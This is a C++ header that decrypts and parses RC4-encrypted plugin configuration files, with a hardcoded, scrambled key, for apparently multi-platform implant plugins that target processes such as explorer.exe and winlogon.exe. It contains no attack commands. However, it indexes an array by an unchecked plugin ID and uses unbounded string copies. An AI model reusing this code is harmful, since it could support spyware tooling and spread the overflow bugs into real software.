#ifndef CONFIGPARSER_H
#define CONFIGPARSER_H

#include <WinSock2.h>
#include <Windows.h>
#include "adkprecomp.h"
#include "adkmemory.h"
#include "AdkRc4.h"

#include "include/T5.h"

#include "Winsock2.h"

#include "include/PacketType.h"

#include <QtGui>
#include <QFileDialog>
#include <vector>
#include <string>

#include <Ws2tcpip.h>

#define  MAX_PLG_COUNT 32

typedef struct _PLUGIN_ALIAS
{
	DWORD dwPluginNumber;			// 1、2、3、4
	WCHAR wzPluginName[MAX_PATH];	// XXX.dat
}PLUGIN_ALIAS, *PPLUGIN_ALIAS;

class GenerateThread;
class WaitDlg;

typedef struct _PLUGIN_CONTEXT
{
	ULONG			dwPluginId;
	PCHAR			lpszPluginName;			// 需要手工 free
	ULONG			dwPluginVer;
	ULONG			dwUpdateVer;
	ULONG			dwLoadType;
	ULONG			dwUpdateType;
	PCHAR			lpszProcList;			// 需要手工 free

	// 插件数据
	//
	DWORD			dwDataLen;
	PBYTE			lpbyData;				// 需要手工 free

} PLUGIN_CXT,
*PPLUGIN_CXT,
PLUGIN_CONTEXT,
*PPLUGIN_CONTEXT;

class ConfigParser
{
public:
	PPLUGIN_CXT         MacPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         IosPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         WindowsPlgCxtVect[MAX_PLG_COUNT];
	PPLUGIN_CXT         AndroidPlgCxtVect[MAX_PLG_COUNT];
	ULONG               plgCount;

	ConfigParser() : plgCount(0)
	{
		ZeroMemory(this->MacPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
		ZeroMemory(this->IosPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
		ZeroMemory(this->WindowsPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));
		ZeroMemory(this->AndroidPlgCxtVect, MAX_PLG_COUNT*sizeof(PPLUGIN_CXT));

		ReadPluginInfo(WindowsPlgCxtVect);
		ReadPluginInfo(MacPlgCxtVect);
		ReadPluginInfo(IosPlgCxtVect);
		ReadPluginInfo(AndroidPlgCxtVect);

	}

	bool ReadPluginInfo(PPLUGIN_CXT PlgCxtVect[])
	{
		CHAR szDatPath[MAX_PATH] = {0};
		GetModuleFileNameA(0, szDatPath, MAX_PATH);
		LPSTR szName = strrchr(szDatPath, '\\');

		if ( MacPlgCxtVect == PlgCxtVect )
		{
			strcpy(szName, "\\_Plugin\\MACOSX\\update.dat");
		}
		else if ( IosPlgCxtVect == PlgCxtVect )
		{
			strcpy(szName, "\\_Plugin\\IOS\\update.dat");
		}
		else if ( WindowsPlgCxtVect == PlgCxtVect )
		{
			strcpy(szName, "\\_Plugin\\WINDOWS\\update.dat");
		}
		else if ( AndroidPlgCxtVect == PlgCxtVect )
		{
			strcpy(szName, "\\_Plugin\\ANDROID\\update.dat");
		}

		FILE *hFile = fopen(szDatPath,"rb");
		if (hFile == NULL)
		{
			//MessageBoxA(this->Handle, "不能找到插件配置文件!", "提示", MB_OK | MB_ICONINFORMATION);
			return false;
		}

		char        rBuf[4096];
		char	    *pParam		= rBuf;
		char	    *pParamNext	= NULL;
		char	    *pDelim		= NULL;
		PPLUGIN_CXT	pluginCxt	;

		memset(rBuf, 0, 4096);
		int numRead = fread(rBuf, sizeof(char), 4096, hFile);
		if (numRead == 0 || !feof(hFile))
		{
			MessageBoxA(NULL, "插件配置文件不正确!", "提示", MB_OK | MB_ICONINFORMATION);
			fclose(hFile);        
			return false;
		}    
		fclose(hFile);

		// rc4 encrypt target config content
		//
		BYTE  keyForRc4[8];
		keyForRc4[4] = '%';
		keyForRc4[5] = '+';
		keyForRc4[6] = 'w';
		keyForRc4[7] = 'f';
		keyForRc4[2] = ')';
		keyForRc4[0] = '#';
		keyForRc4[1] = '*';
		keyForRc4[3] = '(';

		RC4_KEY	   rc4Key;
		AdkBuildRc4Key(keyForRc4, 8, &rc4Key);
		AdkRc4Handler((BYTE *)rBuf, numRead, &rc4Key);

		do
		{
			pParamNext = strstr(pParam,"\r\n");
			if (!pParamNext)
			{
				break;
			}

			pParamNext[0] = '\0';

			// malloc a new pluginBlock to represent corresponding plugin dll
			//
			pluginCxt = (PPLUGIN_CXT)malloc(sizeof(PLUGIN_CXT));
			ZeroMemory(pluginCxt, sizeof(PLUGIN_CXT));

			// Plugin Format
			//
			//		PID|FILENAME|VER|LOADTYPE|INSTALLTYPE|PROC
			//	
			//	PROC
			//		*			---  all program
			//		explorer.exe;winlogon.exe;xxx;yyy;zzz;
			//
			do
			{
				pDelim  = strchr(pParam,'|');
				if (!pDelim)
				{
					break;
				}
				pDelim[0] = '\0';
				pluginCxt->dwPluginId = strtoul(pParam,NULL,10);

				pParam = pDelim + 1;
				pDelim = strchr(pParam,'|');
				if (!pDelim)
				{
					break;
				}
				pDelim[0] = '\0';
				pluginCxt->lpszPluginName = strdup(pParam);

				pParam = pDelim + 1;
				pDelim = strchr(pParam,'|');
				if (!pDelim)
				{
					break;
				}
				pDelim[0] = '\0';
				pluginCxt->dwPluginVer = atoi(pParam);

				pParam = pDelim + 1;
				pDelim = strchr(pParam,'|');
				if (!pDelim)
				{
					break;
				}
				pDelim[0] = '\0';
				pluginCxt->dwLoadType = atoi(pParam);

				pParam = pDelim + 1;
				pDelim = strchr(pParam,'|');
				if (!pDelim)
				{
					break;
				}
				pDelim[0] = '\0';
				pluginCxt->dwUpdateType = atoi(pParam);

				pParam = pDelim + 1;
				pluginCxt->lpszProcList = strdup(pParam);

			} while(false);

			if (!pDelim)
			{
				// Config file is corruptted
				//
				MessageBoxA(NULL, "插件配置文件不正确!", "提示", MB_OK | MB_ICONINFORMATION);
				AdkFree(pluginCxt);
				return false;
			}
			else
			{
				PlgCxtVect[pluginCxt->dwPluginId] = pluginCxt;
				plgCount++;
			}

			// Read next plugin info 
			//
			pParam = pParamNext + 2;
			if (UINT(pParam - rBuf) >= numRead)
			{
				break;
			}

		} while(true);

		return true;
	}
};

extern ConfigParser* FrmMain;

inline std::wstring GetExePath()
{
	WCHAR wzExePath[MAX_PATH] = {0};
	GetModuleFileNameW(0, wzExePath, MAX_PATH);
	LPWSTR wzName = wcsrchr(wzExePath, L'\\');
	wcscpy(wzName, L"");

	return std::wstring(wzExePath);
}

inline bool SHCopy(LPCWSTR from, LPCWSTR to)
{
	//Log(_T("Recursive file copy from %s to %s"), from, to);

	SHFILEOPSTRUCT fileOp = {0};
	fileOp.wFunc = FO_COPY;
	TCHAR newFrom[MAX_PATH];
	wcscpy(newFrom, from);
	newFrom[wcslen(from) + 1] = NULL;
	fileOp.pFrom = newFrom;
	WCHAR newTo[MAX_PATH];
	wcscpy(newTo, to);
	newTo[wcslen(to) + 1] = NULL;
	fileOp.pTo = newTo;
	fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_NOCONFIRMMKDIR;

	int result = SHFileOperation(&fileOp);

	//Log(_T("SHFileOperation return code: 0x%x"), result);

	return result == 0;
}

inline bool SHDel(LPCWSTR dir)
{
	WCHAR wzTemp[MAX_PATH] = {0};
	wcscpy(wzTemp, dir);
	SHFILEOPSTRUCTW FileOp;
	FileOp.fFlags = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI;
	FileOp.pFrom = wzTemp;
	FileOp.pTo = NULL;
	FileOp.wFunc = FO_DELETE;
	int result = SHFileOperationW(&FileOp);
	return result == 0;
}

#endif // CONFIGPARSER_H